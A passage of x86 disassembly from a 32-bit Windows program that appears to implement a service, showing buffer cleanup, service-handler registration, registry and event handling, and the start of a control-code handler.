  407364:	push   ebx
  407365:	push   ebx
  407366:	push   ebx
  407367:	lea    eax,[esp+0xa8]
  40736e:	push   eax
  40736f:	call   DWORD PTR ds:0x40e174
  407375:	test   eax,eax
  407377:	jne    0x40733c
  407379:	mov    al,BYTE PTR [esp+0x1b]
  40737d:	test   al,al
  40737f:	jne    0x407496
  407385:	push   0x1cff
  40738a:	push   0xffffffff
  40738c:	push   ebx
  40738d:	lea    eax,[esp+0xb90]
  407394:	push   eax
  407395:	push   0x3
  407397:	call   DWORD PTR ds:0x40e16c
  40739d:	test   eax,eax
  40739f:	jne    0x4072d9
  4073a5:	jmp    0x407496
  4073aa:	mov    al,0x1
  4073ac:	mov    BYTE PTR [esp+0x1b],al
  4073b0:	jmp    0x40737d
  4073b2:	cmp    DWORD PTR [esp+0x14],0xffffffff
  4073b7:	je     0x4073c3
  4073b9:	push   DWORD PTR [esp+0x14]
  4073bd:	call   DWORD PTR ds:0x40e120
  4073c3:	call   DWORD PTR ds:0x40e0f4
  4073c9:	mov    edx,eax
  4073cb:	mov    ecx,0x401b60
  4073d0:	call   0x4053b7
  4073d5:	mov    esi,0x641
  4073da:	mov    ebx,0x100
  4073df:	cmp    DWORD PTR [esp+0x40c],ebx
  4073e6:	jle    0x4073ff
  4073e8:	cmp    DWORD PTR [esp+0x408],0x0
  4073f0:	je     0x4073ff
  4073f2:	push   DWORD PTR [esp+0x408]
  4073f9:	call   DWORD PTR ds:0x40e104
  4073ff:	cmp    DWORD PTR [esp+0x51c],ebx
  407406:	jle    0x40741f
  407408:	cmp    DWORD PTR [esp+0x518],0x0
  407410:	je     0x40741f
  407412:	push   DWORD PTR [esp+0x518]
  407419:	call   DWORD PTR ds:0x40e104
  40741f:	cmp    DWORD PTR [esp+0x62c],ebx
  407426:	jle    0x40743f
  407428:	cmp    DWORD PTR [esp+0x628],0x0
  407430:	je     0x40743f
  407432:	push   DWORD PTR [esp+0x628]
  407439:	call   DWORD PTR ds:0x40e104
  40743f:	cmp    DWORD PTR [esp+0x73c],ebx
  407446:	jle    0x40745f
  407448:	cmp    DWORD PTR [esp+0x738],0x0
  407450:	je     0x40745f
  407452:	push   DWORD PTR [esp+0x738]
  407459:	call   DWORD PTR ds:0x40e104
  40745f:	cmp    DWORD PTR [esp+0xe4],ebx
  407466:	jle    0x407603
  40746c:	cmp    DWORD PTR [esp+0xe0],0x0
  407474:	je     0x407603
  40747a:	push   DWORD PTR [esp+0xe0]
  407481:	call   DWORD PTR ds:0x40e104
  407487:	jmp    0x407603
  40748c:	push   DWORD PTR [esp+0x44]
  407490:	call   DWORD PTR ds:0x40e120
  407496:	mov    eax,DWORD PTR [esp+0x20]
  40749a:	push   eax
  40749b:	mov    ecx,DWORD PTR [eax]
  40749d:	mov    esi,DWORD PTR [ecx+0x8]
  4074a0:	mov    ecx,esi
  4074a2:	call   DWORD PTR ds:0x40e20c
  4074a8:	call   esi
  4074aa:	push   edi
  4074ab:	call   DWORD PTR ds:0x40e120
  4074b1:	mov    ebx,0x100
  4074b6:	cmp    DWORD PTR [esp+0x40c],ebx
  4074bd:	jle    0x4074d6
  4074bf:	cmp    DWORD PTR [esp+0x408],0x0
  4074c7:	je     0x4074d6
  4074c9:	push   DWORD PTR [esp+0x408]
  4074d0:	call   DWORD PTR ds:0x40e104
  4074d6:	cmp    DWORD PTR [esp+0x51c],ebx
  4074dd:	jle    0x4074f6
  4074df:	cmp    DWORD PTR [esp+0x518],0x0
  4074e7:	je     0x4074f6
  4074e9:	push   DWORD PTR [esp+0x518]
  4074f0:	call   DWORD PTR ds:0x40e104
  4074f6:	cmp    DWORD PTR [esp+0x62c],ebx
  4074fd:	jle    0x407516
  4074ff:	cmp    DWORD PTR [esp+0x628],0x0
  407507:	je     0x407516
  407509:	push   DWORD PTR [esp+0x628]
  407510:	call   DWORD PTR ds:0x40e104
  407516:	cmp    DWORD PTR [esp+0x73c],ebx
  40751d:	jle    0x407536
  40751f:	cmp    DWORD PTR [esp+0x738],0x0
  407527:	je     0x407536
  407529:	push   DWORD PTR [esp+0x738]
  407530:	call   DWORD PTR ds:0x40e104
  407536:	cmp    DWORD PTR [esp+0xe4],ebx
  40753d:	jle    0x407556
  40753f:	cmp    DWORD PTR [esp+0xe0],0x0
  407547:	je     0x407556
  407549:	push   DWORD PTR [esp+0xe0]
  407550:	call   DWORD PTR ds:0x40e104
  407556:	cmp    DWORD PTR [esp+0x60],0x0
  40755b:	je     0x407576
  40755d:	cmp    DWORD PTR ds:0x40cc24,0x0
  407564:	jne    0x407576
  407566:	mov    eax,ds:0x40cb08
  40756b:	test   eax,eax
  40756d:	je     0x407576
  40756f:	push   eax
  407570:	call   DWORD PTR ds:0x40e1f8
  407576:	call   DWORD PTR ds:0x40e200
  40757c:	cmp    DWORD PTR [esp+0x74],0x0
  407581:	je     0x4075fd
  407583:	mov    esi,0x641
  407588:	mov    ecx,esi
  40758a:	call   0x4055e0
  40758f:	jmp    0x407603
  407591:	call   DWORD PTR ds:0x40e0f4
  407597:	mov    edx,eax
  407599:	mov    ecx,0x401850
  40759e:	call   0x4053b7
  4075a3:	mov    ebx,0x641
  4075a8:	mov    esi,ebx
  4075aa:	jmp    0x407603
  4075ac:	mov    DWORD PTR ds:0x40c424,0x1
  4075b6:	push   ebx
  4075b7:	push   ebx
  4075b8:	push   ebx
  4075b9:	lea    eax,[esp+0xc0]
  4075c0:	push   eax
  4075c1:	call   DWORD PTR ds:0x40e164
  4075c7:	test   eax,eax
  4075c9:	jne    0x4075df
  4075cb:	cmp    DWORD PTR ds:0x40cc2c,eax
  4075d1:	je     0x407556
  4075d3:	cmp    DWORD PTR ds:0x40cba4,eax
  4075d9:	je     0x407556
  4075df:	lea    eax,[esp+0xb4]
  4075e6:	push   eax
  4075e7:	call   DWORD PTR ds:0x40e160
  4075ed:	lea    eax,[esp+0xb4]
  4075f4:	push   eax
  4075f5:	call   DWORD PTR ds:0x40e17c
  4075fb:	jmp    0x4075b6
  4075fd:	mov    eax,DWORD PTR [esp+0x24]
  407601:	mov    esi,eax
  407603:	lea    ecx,[esp+0x1f0]
  40760a:	call   0x40809b
  40760f:	lea    ecx,[esp+0xd0]
  407616:	call   0x407f6a
  40761b:	mov    ecx,DWORD PTR [esp+0x27f4]
  407622:	mov    eax,esi
  407624:	pop    edi
  407625:	pop    esi
  407626:	pop    ebx
  407627:	xor    ecx,esp
  407629:	call   0x409090
  40762e:	mov    esp,ebp
  407630:	pop    ebp
  407631:	ret    
  407632:	int3   
  407633:	int3   
  407634:	int3   
  407635:	int3   
  407636:	int3   
  407637:	mov    edi,edi
  407639:	push   ebp
  40763a:	mov    ebp,esp
  40763c:	push   ecx
  40763d:	push   ecx
  40763e:	and    DWORD PTR [ebp-0x4],0x0
  407642:	xor    eax,eax
  407644:	and    eax,0xfffffffd
  407647:	mov    BYTE PTR [ebp-0x4],0x1
  40764b:	or     eax,0x1
  40764e:	mov    DWORD PTR [ebp-0x8],eax
  407651:	lea    eax,[ebp-0x8]
  407654:	push   0x8
  407656:	push   eax
  407657:	push   0x0
  407659:	call   DWORD PTR ds:0x40e0c8
  40765f:	mov    esp,ebp
  407661:	pop    ebp
  407662:	ret    
  407663:	int3   
  407664:	int3   
  407665:	int3   
  407666:	int3   
  407667:	int3   
  407668:	push   0x28
  40766a:	push   0x409ed0
  40766f:	call   0x409a1c
  407674:	mov    DWORD PTR [ebp-0x30],0x8
  40767b:	mov    DWORD PTR [ebp-0x2c],0x20
  407682:	and    DWORD PTR [ebp-0x20],0x0
  407686:	call   0x407637
  40768b:	and    DWORD PTR [ebp-0x4],0x0
  40768f:	lea    eax,[ebp-0x30]
  407692:	push   eax
  407693:	mov    esi,DWORD PTR ds:0x40b060
  407699:	mov    ecx,esi
  40769b:	call   DWORD PTR ds:0x40e20c
  4076a1:	call   esi
  4076a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4076a6:	call   0x405d7c
  4076ab:	mov    DWORD PTR [ebp-0x20],eax
  4076ae:	jmp    0x4076e1
  4076b0:	mov    ecx,DWORD PTR [ebp-0x14]
  4076b3:	mov    eax,DWORD PTR [ecx]
  4076b5:	mov    eax,DWORD PTR [eax]
  4076b7:	mov    DWORD PTR [ebp-0x34],eax
  4076ba:	mov    DWORD PTR [ebp-0x24],ecx
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	cmp    DWORD PTR [ebp-0x24],0x0
  4076c4:	je     0x4076d3
  4076c6:	mov    ecx,DWORD PTR [ebp-0x24]
  4076c9:	call   0x405ce5
  4076ce:	mov    DWORD PTR [ebp-0x28],eax
  4076d1:	jmp    0x4076da
  4076d3:	mov    DWORD PTR [ebp-0x28],0x0
  4076da:	mov    eax,DWORD PTR [ebp-0x28]
  4076dd:	ret    
  4076de:	mov    esp,DWORD PTR [ebp-0x18]
  4076e1:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4076e8:	call   0x4089a5
  4076ed:	push   DWORD PTR [ebp-0x20]
  4076f0:	call   DWORD PTR ds:0x40e078
  4076f6:	int3   
  4076f7:	int3   
  4076f8:	int3   
  4076f9:	int3   
  4076fa:	int3   
  4076fb:	int3   
  4076fc:	int3   
  4076fd:	int3   
  4076fe:	int3   
  4076ff:	int3   
  407700:	mov    edi,edi
  407702:	push   ebp
  407703:	mov    ebp,esp
  407705:	sub    esp,0x10
  407708:	and    DWORD PTR [ebp-0x8],0x0
  40770c:	lea    eax,[ebp-0x10]
  40770f:	and    DWORD PTR [ebp-0x4],0x0
  407713:	push   eax
  407714:	mov    DWORD PTR [ebp-0x10],0x401208
  40771b:	mov    DWORD PTR [ebp-0xc],0x407760
  407722:	call   DWORD PTR ds:0x40e008
  407728:	test   eax,eax
  40772a:	jne    0x407743
  40772c:	call   DWORD PTR ds:0x40e0f4
  407732:	mov    edx,eax
  407734:	mov    ecx,0x401c30
  407739:	call   0x4053b7
  40773e:	xor    eax,eax
  407740:	inc    eax
  407741:	jmp    0x407748
  407743:	mov    eax,0x8000
  407748:	mov    esp,ebp
  40774a:	pop    ebp
  40774b:	ret    
  40774c:	int3   
  40774d:	int3   
  40774e:	int3   
  40774f:	int3   
  407750:	int3   
  407751:	int3   
  407752:	int3   
  407753:	int3   
  407754:	int3   
  407755:	int3   
  407756:	int3   
  407757:	int3   
  407758:	int3   
  407759:	int3   
  40775a:	int3   
  40775b:	int3   
  40775c:	int3   
  40775d:	int3   
  40775e:	int3   
  40775f:	int3   
  407760:	push   0x407e70
  407765:	push   0x401208
  40776a:	call   DWORD PTR ds:0x40e060
  407770:	mov    ds:0x40cb94,eax
  407775:	test   eax,eax
  407777:	jne    0x40778d
  407779:	call   DWORD PTR ds:0x40e0f4
  40777f:	mov    edx,eax
  407781:	mov    ecx,0x401268
  407786:	call   0x4053b7
  40778b:	jmp    0x4077f3
  40778d:	push   esi
  40778e:	push   edi
  40778f:	push   ecx
  407790:	mov    edi,0x7530
  407795:	xor    esi,esi
  407797:	push   edi
  407798:	push   esi
  407799:	push   0x2
  40779b:	call   0x403539
  4077a0:	test   eax,eax
  4077a2:	je     0x4077f1
  4077a4:	push   0x40cb0c
  4077a9:	push   esi
  4077aa:	push   esi
  4077ab:	push   0x407800
  4077b0:	push   esi
  4077b1:	push   esi
  4077b2:	call   DWORD PTR ds:0x40e128
  4077b8:	mov    esi,eax
  4077ba:	test   esi,esi
  4077bc:	jne    0x4077d0
  4077be:	push   ecx
  4077bf:	push   edi
  4077c0:	call   DWORD PTR ds:0x40e0f4
  4077c6:	push   eax
  4077c7:	push   0x1
  4077c9:	call   0x403539
  4077ce:	jmp    0x4077f1
  4077d0:	mov    eax,ds:0x40b0a4
  4077d5:	cmp    eax,0xffffffff
  4077d8:	je     0x4077e1
  4077da:	push   eax
  4077db:	call   DWORD PTR ds:0x40e120
  4077e1:	mov    DWORD PTR ds:0x40b0a4,esi
  4077e7:	mov    DWORD PTR ds:0x40c424,0x2
  4077f1:	pop    edi
  4077f2:	pop    esi
  4077f3:	ret    0x8
  4077f6:	int3   
  4077f7:	int3   
  4077f8:	int3   
  4077f9:	int3   
  4077fa:	int3   
  4077fb:	int3   
  4077fc:	int3   
  4077fd:	int3   
  4077fe:	int3   
  4077ff:	int3   
  407800:	mov    edi,edi
  407802:	push   ebp
  407803:	mov    ebp,esp
  407805:	sub    esp,0xca4
  40780b:	mov    eax,ds:0x40b000
  407810:	xor    eax,ebp
  407812:	mov    DWORD PTR [ebp-0x4],eax
  407815:	push   ebx
  407816:	push   ecx
  407817:	push   0x7530
  40781c:	xor    ebx,ebx
  40781e:	push   ebx
  40781f:	push   0x2
  407821:	mov    DWORD PTR [ebp-0xc5c],ebx
  407827:	call   0x403539
  40782c:	test   eax,eax
  40782e:	je     0x407e39
  407834:	lea    eax,[ebp-0xc5c]
  40783a:	push   eax
  40783b:	push   0x20019
  407840:	push   ebx
  407841:	push   0x401c78
  407846:	push   0x80000000
  40784b:	call   DWORD PTR ds:0x40e058
  407851:	test   eax,eax
  407853:	jne    0x407861
  407855:	push   DWORD PTR [ebp-0xc5c]
  40785b:	call   DWORD PTR ds:0x40e06c
  407861:	push   esi
  407862:	mov    esi,DWORD PTR ds:0x40b050
  407868:	mov    ecx,esi
  40786a:	push   edi
  40786b:	push   ebx
  40786c:	push   ebx
  40786d:	call   DWORD PTR ds:0x40e20c
  407873:	call   esi
  407875:	mov    esi,eax
  407877:	mov    DWORD PTR [ebp-0xc54],esi
  40787d:	call   0x4032a4
  407882:	mov    DWORD PTR [ebp-0xc64],0x200
  40788c:	call   0x402a6e
  407891:	push   ecx
  407892:	push   0x5
  407894:	lea    edx,[ebp-0xc64]
  40789a:	lea    ecx,[ebp-0x204]
  4078a0:	call   0x402bcb
  4078a5:	mov    edi,eax
  4078a7:	pop    ecx
  4078a8:	pop    ecx
  4078a9:	test   edi,edi
  4078ab:	je     0x4078be
  4078ad:	test   esi,esi
  4078af:	js     0x4078b7
  4078b1:	call   DWORD PTR ds:0x40e200
  4078b7:	mov    eax,edi
  4078b9:	jmp    0x407e37
  4078be:	mov    eax,DWORD PTR [ebp-0xc64]
  4078c4:	lea    ecx,[ebp-0x41c]
  4078ca:	push   eax
  4078cb:	mov    DWORD PTR [ebp-0xc74],eax
  4078d1:	mov    DWORD PTR [ebp-0xc58],eax
  4078d7:	mov    DWORD PTR [ebp-0xc68],eax
  4078dd:	mov    DWORD PTR [ebp-0xc60],eax
  4078e3:	mov    DWORD PTR [ebp-0xc6c],eax
  4078e9:	call   0x407fdf
  4078ee:	push   DWORD PTR [ebp-0xc58]
  4078f4:	lea    ecx,[ebp-0x834]
  4078fa:	call   0x407fdf
  4078ff:	push   DWORD PTR [ebp-0xc68]
  407905:	lea    ecx,[ebp-0x628]
  40790b:	call   0x407fdf
  407910:	push   DWORD PTR [ebp-0xc60]
  407916:	lea    ecx,[ebp-0xc4c]
  40791c:	call   0x407fdf
  407921:	push   DWORD PTR [ebp-0xc6c]
  407927:	lea    ecx,[ebp-0xa40]
  40792d:	call   0x407fdf
  407932:	mov    edi,DWORD PTR [ebp-0x41c]
  407938:	test   edi,edi
  40793a:	je     0x407da6
  407940:	mov    eax,DWORD PTR [ebp-0x834]
  407946:	test   eax,eax
  407948:	je     0x407da6
  40794e:	mov    ecx,DWORD PTR [ebp-0x628]
  407954:	test   ecx,ecx
  407956:	je     0x407da6
  40795c:	mov    edx,DWORD PTR [ebp-0xc4c]
  407962:	test   edx,edx
  407964:	je     0x407da6
  40796a:	mov    esi,DWORD PTR [ebp-0xa40]
  407970:	test   esi,esi
  407972:	je     0x407da0
  407978:	lea    edi,[ebp-0xc6c]
  40797e:	push   edi
  40797f:	mov    edi,DWORD PTR [ebp-0x41c]
  407985:	push   esi
  407986:	lea    esi,[ebp-0xc60]
  40798c:	push   esi
  40798d:	push   edx
  40798e:	lea    edx,[ebp-0xc68]
  407994:	push   edx
  407995:	push   ecx
  407996:	lea    ecx,[ebp-0xc58]
  40799c:	push   ecx
  40799d:	push   eax
  40799e:	lea    eax,[ebp-0xc74]
  4079a4:	push   eax
  4079a5:	push   edi
  4079a6:	lea    eax,[ebp-0x204]
  4079ac:	push   eax
  4079ad:	call   DWORD PTR ds:0x40e038
  4079b3:	test   eax,eax
  4079b5:	jne    0x4079d2
  4079b7:	cmp    DWORD PTR [ebp-0xc54],ebx
  4079bd:	jl     0x4079c5
  4079bf:	call   DWORD PTR ds:0x40e200
  4079c5:	call   DWORD PTR ds:0x40e0f4
  4079cb:	mov    ebx,eax
  4079cd:	jmp    0x407db3
  4079d2:	mov    esi,DWORD PTR ds:0x40b048
  4079d8:	mov    ecx,esi
  4079da:	push   ebx
  4079db:	push   ebx
  4079dc:	push   ebx
  4079dd:	push   0x2
  4079df:	push   0x2
  4079e1:	push   ebx
  4079e2:	push   ebx
  4079e3:	push   0xffffffff
  4079e5:	push   DWORD PTR [ebp-0x41c]
  4079eb:	call   DWORD PTR ds:0x40e20c
  4079f1:	call   esi
  4079f3:	test   eax,eax
  4079f5:	je     0x407a2a
  4079f7:	mov    edx,eax
  4079f9:	mov    ecx,0x401c88
  4079fe:	call   0x4053b7
  407a03:	push   ecx
  407a04:	push   ebx
  407a05:	call   DWORD PTR ds:0x40e0f4
  407a0b:	push   eax
  407a0c:	push   0x1
  407a0e:	call   0x403539
  407a13:	cmp    DWORD PTR [ebp-0xc54],ebx
  407a19:	jl     0x407db3
  407a1f:	call   DWORD PTR ds:0x40e200
  407a25:	jmp    0x407db3
  407a2a:	push   ecx
  407a2b:	push   0x7530
  407a30:	push   ebx
  407a31:	push   0x2
  407a33:	call   0x403539
  407a38:	test   eax,eax
  407a3a:	je     0x407a13
  407a3c:	push   ecx
  407a3d:	push   ecx
  407a3e:	lea    edx,[ebp-0xc70]
  407a44:	mov    DWORD PTR [ebp-0xc80],ebx
  407a4a:	lea    ecx,[ebp-0xc84]
  407a50:	mov    DWORD PTR [ebp-0xc88],0xc
  407a5a:	mov    DWORD PTR [ebp-0xc70],ebx
  407a60:	call   0x403253
  407a65:	pop    ecx
  407a66:	pop    ecx
  407a67:	test   eax,eax
  407a69:	je     0x407a74
  407a6b:	xor    edx,edx
  407a6d:	mov    ecx,0x401ce8
  407a72:	jmp    0x4079fe
  407a74:	push   0x40c7b0
  407a79:	mov    DWORD PTR ds:0x40cd70,ebx
  407a7f:	mov    DWORD PTR ds:0x40cc1c,ebx
  407a85:	mov    DWORD PTR ds:0x40cc10,ebx
  407a8b:	call   DWORD PTR ds:0x40e0ac
  407a91:	or     DWORD PTR [ebp-0xc78],0xffffffff
  407a98:	push   ebx
  407a99:	push   ebx
  407a9a:	push   0x1
  407a9c:	push   ebx
  407a9d:	mov    BYTE PTR [ebp-0xc4d],0x1
  407aa4:	mov    DWORD PTR [ebp-0xc7c],0x4d2fa200
  407aae:	call   DWORD PTR ds:0x40e110
  407ab4:	push   ebx
  407ab5:	push   ebx
  407ab6:	push   ebx
  407ab7:	push   ebx
  407ab8:	mov    ds:0x40cc1c,eax
  407abd:	call   DWORD PTR ds:0x40e110
  407ac3:	mov    ds:0x40cd70,eax
  407ac8:	cmp    DWORD PTR ds:0x40cc1c,ebx
  407ace:	je     0x407cbb
  407ad4:	test   eax,eax
  407ad6:	je     0x407cbb
  407adc:	mov    esi,DWORD PTR ds:0x40b05c
  407ae2:	lea    eax,[ebp-0xc88]
  407ae8:	push   ebx
  407ae9:	push   0x1
  407aeb:	push   eax
  407aec:	mov    ecx,esi
  407aee:	call   DWORD PTR ds:0x40e20c
  407af4:	call   esi
  407af6:	mov    ds:0x40cc10,eax
  407afb:	test   eax,eax
  407afd:	jne    0x407b0f
  407aff:	call   DWORD PTR ds:0x40e0f4
  407b05:	mov    ecx,0x401db0
  407b0a:	jmp    0x407cc6
  407b0f:	mov    esi,DWORD PTR ds:0x40b058
  407b15:	lea    ecx,[ebp-0xc7c]
  407b1b:	push   ebx
  407b1c:	push   ebx
  407b1d:	push   ebx
  407b1e:	push   ebx
  407b1f:	push   ecx
  407b20:	push   eax
  407b21:	mov    ecx,esi
  407b23:	call   DWORD PTR ds:0x40e20c
  407b29:	call   esi
  407b2b:	test   eax,eax
  407b2d:	jne    0x407b3f
  407b2f:	call   DWORD PTR ds:0x40e0f4
  407b35:	mov    ecx,0x401e10
  407b3a:	jmp    0x407cc6
  407b3f:	mov    esi,0x402078
  407b44:	mov    edi,ebx
  407b46:	push   ecx
  407b47:	push   0x7530
  407b4c:	push   ebx
  407b4d:	push   0x2
  407b4f:	call   0x403539
  407b54:	test   eax,eax
  407b56:	je     0x407ce3
  407b5c:	lea    eax,[edi+0x40cb08]
  407b62:	push   eax
  407b63:	push   0x1
  407b65:	push   0x15
  407b67:	lea    eax,[edi+0x40b8bc]
  407b6d:	push   eax
  407b6e:	push   esi
  407b6f:	call   DWORD PTR ds:0x40e1fc
  407b75:	test   eax,eax
  407b77:	jne    0x407cb4
  407b7d:	add    esi,0x10
  407b80:	add    edi,0x4
  407b83:	cmp    esi,0x402088
  407b89:	jl     0x407b46
  407b8b:	push   ecx
  407b8c:	push   ebx
  407b8d:	push   ebx
  407b8e:	push   0x4
  407b90:	call   0x403539
  407b95:	test   eax,eax
  407b97:	je     0x407ce3
  407b9d:	mov    eax,ds:0x40cc10
  407ba2:	mov    DWORD PTR [ebp-0x210],eax
  407ba8:	mov    eax,ds:0x40cc1c
  407bad:	mov    DWORD PTR [ebp-0x20c],eax
  407bb3:	mov    eax,ds:0x40cd70
  407bb8:	push   0x3
  407bba:	mov    DWORD PTR [ebp-0x208],eax
  407bc0:	pop    esi
  407bc1:	cmp    BYTE PTR ds:0x40c420,bl
  407bc7:	je     0x407bde
  407bc9:	call   0x405514
  407bce:	test   eax,eax
  407bd0:	je     0x407bde
  407bd2:	cmp    DWORD PTR ds:0x40cba4,ebx
  407bd8:	jle    0x407c9d
  407bde:	push   0x1cff
  407be3:	push   0xffffffff
  407be5:	push   ebx
  407be6:	lea    eax,[ebp-0x210]
  407bec:	push   eax
  407bed:	push   esi
  407bee:	call   DWORD PTR ds:0x40e16c
  407bf4:	cmp    eax,esi
  407bf6:	je     0x407c37
  407bf8:	test   eax,eax
  407bfa:	jne    0x407c52
  407bfc:	mov    BYTE PTR ds:0x40c420,0x1
  407c03:	call   0x405514
  407c08:	test   eax,eax
  407c0a:	jne    0x407c94
  407c10:	mov    BYTE PTR ds:0x40c420,bl
  407c16:	call   0x40558e
  407c1b:	jmp    0x407bc1
  407c1d:	lea    eax,[ebp-0xca4]
  407c23:	push   eax
  407c24:	call   DWORD PTR ds:0x40e160
  407c2a:	lea    eax,[ebp-0xca4]
  407c30:	push   eax
  407c31:	call   DWORD PTR ds:0x40e17c
  407c37:	push   0x1
  407c39:	push   ebx
  407c3a:	push   ebx
  407c3b:	push   ebx
  407c3c:	lea    eax,[ebp-0xca4]
  407c42:	push   eax
  407c43:	call   DWORD PTR ds:0x40e174
  407c49:	test   eax,eax
  407c4b:	jne    0x407c1d
  407c4d:	jmp    0x407bc1
  407c52:	cmp    eax,0x1
  407c55:	je     0x407c94
  407c57:	cmp    eax,0x2
  407c5a:	jne    0x407c6c
  407c5c:	push   ecx
  407c5d:	push   ebx
  407c5e:	push   ebx
  407c5f:	push   DWORD PTR ds:0x40cb7c
  407c65:	call   0x403539
  407c6a:	jmp    0x407c16
  407c6c:	cmp    eax,0xffffffff
  407c6f:	jne    0x407bc1
  407c75:	call   DWORD PTR ds:0x40e0f4
  407c7b:	mov    ds:0x40cbac,eax
  407c80:	call   DWORD PTR ds:0x40e0f4
  407c86:	mov    edx,eax
  407c88:	mov    ecx,0x401ec4
  407c8d:	call   0x4053b7
  407c92:	jmp    0x407c9d
  407c94:	push   ecx
  407c95:	push   ebx
  407c96:	push   ebx
  407c97:	push   esi
  407c98:	call   0x403539
  407c9d:	call   0x407e4f
  407ca2:	mov    eax,ds:0x40cb08
  407ca7:	test   eax,eax
  407ca9:	je     0x407ce3
  407cab:	push   eax
  407cac:	call   DWORD PTR ds:0x40e1f8
  407cb2:	jmp    0x407ce3
  407cb4:	mov    ecx,0x401e68
  407cb9:	jmp    0x407cc6
  407cbb:	call   DWORD PTR ds:0x40e0f4
  407cc1:	mov    ecx,0x401d60
  407cc6:	mov    edx,eax
  407cc8:	call   0x4053b7
  407ccd:	push   ecx
  407cce:	push   ebx
  407ccf:	call   DWORD PTR ds:0x40e0f4
  407cd5:	push   eax
  407cd6:	push   0x1
  407cd8:	call   0x403539
  407cdd:	mov    BYTE PTR [ebp-0xc4d],bl
  407ce3:	cmp    DWORD PTR ds:0x40cc10,ebx
  407ce9:	je     0x407d13
  407ceb:	push   0x40c7b0
  407cf0:	call   DWORD PTR ds:0x40e100
  407cf6:	push   DWORD PTR ds:0x40cc10
  407cfc:	call   DWORD PTR ds:0x40e120
  407d02:	push   0x40c7b0
  407d07:	mov    DWORD PTR ds:0x40cc10,ebx
  407d0d:	call   DWORD PTR ds:0x40e0d4
  407d13:	cmp    DWORD PTR ds:0x40cc1c,ebx
  407d19:	je     0x407d43
  407d1b:	push   0x40c7b0
  407d20:	call   DWORD PTR ds:0x40e100
  407d26:	push   DWORD PTR ds:0x40cc1c
  407d2c:	call   DWORD PTR ds:0x40e120
  407d32:	push   0x40c7b0
  407d37:	mov    DWORD PTR ds:0x40cc1c,ebx
  407d3d:	call   DWORD PTR ds:0x40e0d4
  407d43:	cmp    DWORD PTR ds:0x40cd70,ebx
  407d49:	je     0x407d73
  407d4b:	push   0x40c7b0
  407d50:	call   DWORD PTR ds:0x40e100
  407d56:	push   DWORD PTR ds:0x40cd70
  407d5c:	call   DWORD PTR ds:0x40e120
  407d62:	push   0x40c7b0
  407d67:	mov    DWORD PTR ds:0x40cd70,ebx
  407d6d:	call   DWORD PTR ds:0x40e0d4
  407d73:	cmp    DWORD PTR [ebp-0xc54],ebx
  407d79:	jl     0x407d81
  407d7b:	call   DWORD PTR ds:0x40e200
  407d81:	cmp    BYTE PTR [ebp-0xc4d],bl
  407d87:	je     0x407d93
  407d89:	push   ecx
  407d8a:	push   ebx
  407d8b:	push   ebx
  407d8c:	push   0x1
  407d8e:	call   0x403539
  407d93:	push   0x40c7b0
  407d98:	call   DWORD PTR ds:0x40e11c
  407d9e:	jmp    0x407db3
  407da0:	mov    esi,DWORD PTR [ebp-0xc54]
  407da6:	test   esi,esi
  407da8:	js     0x407db0
  407daa:	call   DWORD PTR ds:0x40e200
  407db0:	push   0xe
  407db2:	pop    ebx
  407db3:	mov    edi,0x200
  407db8:	cmp    DWORD PTR [ebp-0xa3c],edi
  407dbe:	jle    0x407dd1
  407dc0:	mov    esi,DWORD PTR [ebp-0xa40]
  407dc6:	test   esi,esi
  407dc8:	je     0x407dd1
  407dca:	push   esi
  407dcb:	call   DWORD PTR ds:0x40e104
  407dd1:	cmp    DWORD PTR [ebp-0xc48],edi
  407dd7:	jle    0x407dea
  407dd9:	mov    edx,DWORD PTR [ebp-0xc4c]
  407ddf:	test   edx,edx
  407de1:	je     0x407dea
  407de3:	push   edx
  407de4:	call   DWORD PTR ds:0x40e104
  407dea:	cmp    DWORD PTR [ebp-0x624],edi
  407df0:	jle    0x407e03
  407df2:	mov    ecx,DWORD PTR [ebp-0x628]
  407df8:	test   ecx,ecx
  407dfa:	je     0x407e03
  407dfc:	push   ecx
  407dfd:	call   DWORD PTR ds:0x40e104
  407e03:	cmp    DWORD PTR [ebp-0x830],edi
  407e09:	jle    0x407e1c
  407e0b:	mov    eax,DWORD PTR [ebp-0x834]
  407e11:	test   eax,eax
  407e13:	je     0x407e1c
  407e15:	push   eax
  407e16:	call   DWORD PTR ds:0x40e104
  407e1c:	cmp    DWORD PTR [ebp-0x418],edi
  407e22:	jle    0x407e35
  407e24:	mov    edi,DWORD PTR [ebp-0x41c]
  407e2a:	test   edi,edi
  407e2c:	je     0x407e35
  407e2e:	push   edi
  407e2f:	call   DWORD PTR ds:0x40e104
  407e35:	mov    eax,ebx
  407e37:	pop    edi
  407e38:	pop    esi
  407e39:	mov    ecx,DWORD PTR [ebp-0x4]
  407e3c:	xor    ecx,ebp
  407e3e:	pop    ebx
  407e3f:	call   0x409090
  407e44:	mov    esp,ebp
  407e46:	pop    ebp
  407e47:	ret    0x4
  407e4a:	int3   
  407e4b:	int3   
  407e4c:	int3   
  407e4d:	int3   
  407e4e:	int3   
  407e4f:	push   0x0
  407e51:	push   0x0
  407e53:	push   0x12
  407e55:	push   DWORD PTR ds:0x40cb0c
  407e5b:	call   DWORD PTR ds:0x40e178
  407e61:	ret    
  407e62:	int3   
  407e63:	int3   
  407e64:	int3   
  407e65:	int3   
  407e66:	int3   
  407e67:	int3   
  407e68:	int3   
  407e69:	int3   
  407e6a:	int3   
  407e6b:	int3   
  407e6c:	int3   
  407e6d:	int3   
  407e6e:	int3   
  407e6f:	int3   
  407e70:	mov    edi,edi
  407e72:	push   ebp
  407e73:	mov    ebp,esp
  407e75:	mov    eax,DWORD PTR [ebp+0x8]
  407e78:	sub    eax,0x1
  407e7b:	je     0x407ea9
  407e7d:	sub    eax,0x4
  407e80:	jne    0x407edc
  407e82:	mov    BYTE PTR ds:0x40c420,0x1
  407e89:	call   0x405514
  407e8e:	test   eax,eax
  407e90:	je     0x407edc
  407e92:	cmp    DWORD PTR ds:0x40cba4,0x0
  407e99:	jle    0x407ec2
  407e9b:	push   DWORD PTR ds:0x40cd70
  407ea1:	call   DWORD PTR ds:0x40e098
  407ea7:	jmp    0x407edc
  407ea9:	cmp    DWORD PTR ds:0x40cba4,0x0
  407eb0:	mov    BYTE PTR ds:0x40c420,0x1
  407eb7:	jg     0x407ed5
  407eb9:	call   0x405514
  407ebe:	test   eax,eax
  407ec0:	je     0x407ed5
  407ec2:	push   ecx
  407ec3:	push   0x0
